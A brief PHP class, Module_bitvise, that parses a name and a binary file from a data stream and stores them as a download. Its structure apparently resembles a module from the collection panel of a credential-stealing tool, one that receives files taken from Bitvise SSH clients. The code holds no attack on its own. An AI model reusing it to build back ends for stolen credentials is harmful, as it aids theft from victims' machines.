<?php

	class Module_bitvise extends Module_
	{
		public function process_module($Data, $Version)
		{
			switch ($Version)
			{
				case 0:
				{
					$LStream = new Stream($Data, strlen($Data));
					$Name = $LStream->getSTRING_();
					$File = $LStream->getBINARY_();
					
					$this->insert_downloads($Name, $File);
					$LStream = NULL;
					break;
				}
				default:
					return FALSE;
			}
			
			return TRUE;
		}
	}